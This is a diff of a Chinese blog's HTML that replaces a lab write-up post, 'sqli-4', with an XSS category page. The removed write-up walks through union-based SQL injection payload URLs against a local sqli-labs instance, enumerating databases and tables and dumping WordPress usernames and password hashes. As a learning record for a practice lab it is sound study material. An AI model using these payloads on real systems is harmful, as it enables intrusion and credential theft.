@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>sqli-4 | 大棟哥の博客</title>
+  <title>Category: XSS | 大棟哥の博客</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -84,7 +84,7 @@
 </head>
 
 <!--
-<body class="post-template">
+<body class="home-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -254,68 +254,37 @@
 
         <!-- ============================ END Hero Image =========================== -->
       
-<section id="intro">
+
+
+<section id="services">
     <div class="container">
-        <div class="row col-md-offset-2">
-            <div class="col-md-8">
-    			<span class="post-meta">
-      <time datetime="2016-07-07T15:23:23.000Z" itemprop="datePublished">
-          2016-07-07
-      </time>
-    
-</span>
-                <h1>sqli-4</h1>
-            </div>
+        <div class="row">
+            <div class="col-md-10 col-md-offset-1">
+                <div class="row boxes">
+                    
+                    
+                        
+                        
+                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
+                            
+                              <h4 class="title"><a href="/2016/07/21/XSS01/">XSS实例1</a></h4>
+                            
+                            <p><time datetime="2016-07-20T16:57:17.000Z"><a href="/2016/07/21/XSS01/">2016-07-21</a></time></p>
+                        </div>
+                    
+                </div>
+            </div>    
         </div>
-        <div class="col-md-8 col-md-offset-2">
-      		<p>记录学习过程：<br>sqli-lab4<br>1.实验环境：centos上搭建的sqli实验环境，通过本机Firefox上的hackbar插件进行sql<br>注入类型：Union query<br>注入测试：<br>进入实验二界面：<br><a href="http://192.168.111.132/Less-4/" target="_blank" rel="external">http://192.168.111.132/Less-4/</a></p>
-<p><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"><br>按照提示在后边加上参数：<br><a href="http://192.168.111.132/Less-4/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=1</a><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"></p>
-<p>判断注入：<br><a href="http://192.168.111.132/Less-4/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=1</a>“<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%873.png?raw=true" alt="image"></p>
-<p>将后边的注释之后，显示正常：<br><a href="http://192.168.111.132/Less-4/?id=1&quot;)--+" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=1&quot;)--+</a><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%874.png?raw=true" alt="image"></p>
-<p>order by之后有三个字段：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%875.png?raw=true" alt="image"><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%876.png?raw=true" alt="image"></p>
-<p>查找显示位：<br><a href="http://192.168.111.132/Less-4/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=-1</a>“) union select 1,2,3–+<br>有两个显示位<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%877.png?raw=true" alt="image"></p>
-<p>通过显示位来进行信息获取：<br><a href="http://192.168.111.132/Less-4/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=-1</a>“) union select 1,version(),database()–+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%878.png?raw=true" alt="image"></p>
-<p>接下来构造语句：<br>首先查询有多少个库：<br><a href="http://192.168.111.132/Less-4/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=-1</a>“) union select 1,version(),count(distinct+table_schema) from information_schema.tables –+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%879.png?raw=true" alt="image"></p>
-<p>爆库名：<br><a href="http://192.168.111.132/Less-4/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=-1</a>“) union select 1,version(),group_concat(distinct+table_schema) from information_schema.tables –+<br>去重之后的数据库<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%8710.png?raw=true" alt="image"></p>
-<p>爆某一库的表：<br><a href="http://192.168.111.132/Less-4/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-4/?id=-1</a>“) union select 1,version(),group_concat(distinct+table_name) from information_schema.tables where table_schema=’wordpress’–+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%8711.png?raw=true" alt="image"></p>
-<p>爆完表爆字段：<br><a href="http://192.168.111.132/Less-4/" target="_blank" rel="external">http://192.168.111.132/Less-4/</a><br>?id=-1”) union select 1,version(),group_concat(distinct+column_name) from information_schema.columns where table_schema=’wordpress’ and table_name=’wp_users’–+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%8712.png?raw=true" alt="image"></p>
-<p>爆字段里边的内容：<br><a href="http://192.168.111.132/Less-4/" target="_blank" rel="external">http://192.168.111.132/Less-4/</a><br>?id=-1”) union select 1,version(),group_concat(ID,user_login,user_pass) from wordpress.wp_users–+<br>id 用户名和密码：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-4/%E5%9B%BE%E7%89%8713.png?raw=true" alt="image"></p>
-<p>game over<br>总结：<br>group_concat()函数是将爆出来的内容拼接为一行显示出来<br>特别注意的就是刚开始的时候寻找注入点的时候，需要闭合语句，闭合起来不太好闭合，其次就是先报错，然后在报错的基础上构造正确的语句，通过联合注入，获取最终结果！</p>
+    </div>
+</section> 
 
-            <div class="clearfix"></div>
-            <hr class="nogutter">
+<section id="statement">
+    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
+        <div class="row">
+            <p>业精于勤，荒于嬉；行成于思，毁于随。</p>
         </div>
-        <nav class="pagination" role="pagination">
-    
-    <a class="pull-left" href="/2016/07/08/sqli-5/" style="float: left;">
-        ← sqli-5
-    </a>
-    
-    
-    <a class="pull-right" href="/2016/07/06/sqli-3/">
-        sqli-3 →
-    </a>
-    
-</nav>
-
-        <div class="duoshuo">
-<div class="ds-thread" data-thread-key="2016/07/07/sqli-4/" data-title="sqli-4" data-url="http://jiadong.xin/2016/07/07/sqli-4/"></div>
-<script type="text/javascript">
-var duoshuoQuery = {short_name:"duoshuo_name"};
-(function() {
-	var ds = document.createElement('script');
-	ds.type = 'text/javascript';ds.async = true;
-	ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-	ds.charset = 'UTF-8';
-	(document.getElementsByTagName('head')[0] 
-	 || document.getElementsByTagName('body')[0]).appendChild(ds);
-})();
-</script>
-</div>
     </div>
 </section>
-
-
       
 <!-- ============================ Footer =========================== -->
 
